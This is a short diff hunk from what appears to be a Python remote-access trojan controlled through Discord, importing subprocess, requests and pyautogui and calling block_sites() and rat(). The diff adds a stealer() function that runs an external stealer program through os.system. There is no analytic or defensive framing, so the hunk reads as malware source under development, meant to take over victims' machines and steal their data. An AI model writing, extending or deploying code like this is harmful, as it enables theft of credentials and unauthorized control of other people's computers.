@@ -12,6 +12,9 @@ from turnoff import *
 import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
 
 block_sites()
+def stealer():
+    command = "call" + stealerpath
+    os.system(command)
 def code1():
     rat()
 
